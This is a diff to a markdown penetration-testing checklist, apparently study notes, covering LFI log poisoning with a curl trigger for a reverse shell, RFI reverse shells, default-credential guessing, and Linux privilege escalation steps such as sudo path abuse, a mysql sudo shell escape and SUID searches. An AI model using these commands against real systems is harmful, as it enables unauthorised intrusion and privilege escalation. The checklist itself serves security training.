@@ -177,9 +177,16 @@
         - Trigger to check if posioning was successful
           - `curl http://$IP:$PORT?book=../../../../../var/log/apache2/access.log`
           - This would initiate above create reverse shell.
+	- Post LFI
+    	- Password cracking?
+        	- e.g: john hash.txt
 - check for ssh keys
 - check for service/app configuration file (e.g: /etc/tomcat7/tomcat-users)
 - vsftpd -> upload, to rce from upload file
+- ftp -> anonymous and reading of those files
+- source code dump or any expose?
+  - function level exploits?
+    - example backup file containing exploitable functions.
 - RFI
 	- rev shell
 		- https://www.revshells.com/
@@ -193,6 +200,11 @@
 - Drupal
   - droopescan
   - `droopescan scan -u  http://192.168.1.1/`
+- Credential Discovery
+  - Trying some well-known default credentials (e.g. admin:admin, admin:password, admin:root, etc.) , find default username for the software.
+
+- Last resort
+  - Metasploit (if exploit is available)
 
 </details>
 
@@ -206,12 +218,14 @@
 
 - [ ] privileges escalation
 	- [ ] `sudo -l`
+	- [ ] relative path exploitable?
+    	- [ ] Example: `sudo /sudo_permited_location/../home/user/my_file`
 	- [ ] password re-use
 		- [ ] from credentials founds in enum
 		- [ ] `su - <user>`
 			- [ ] ***Stabilize Shell $***
 				- [ ] `which python` -> python is here
-				- [ ] `python -c 'import pty; pty.spawn("/bin/bash")'` -> import valid tty
+				- [ ] `python -c 'import pty; pty.spawn("/bin/bash")'` -> [interactive terminal spawned via python](../../Explain/READEME.md)
 				- [ ] `tty` quick test 
 				- [ ] `export TERM=xterm-256color`  ⇾ export our terminal
 				- [ ] `alias ll='clear ; ls -lsaht --color-auto'` ⇾ export ll command
@@ -219,6 +233,8 @@
 				- [ ] `stty columns 200 rows 200`
 		- [ ] e.g: `sudo /usr/bin/mysql -e '\! /bin/sh'`  [sudo nopass for mysql](https://gtfobins.github.io/gtfobins/mysql/#sudo)
 	- [ ] `netstat -tupanl | grep -i '127.0.0.1'` -> anything running on loopback
+	- [ ] Netstat alternative `ss -tunlp`
+	- [ ] cat /etc/crontab
 	- [ ] `find / -perm -u=s -type f 2>/dev/null` 
 		- [ ] *_The first step is to identify all programs or files that have SUID bits enabled_*
 			- [ ] example
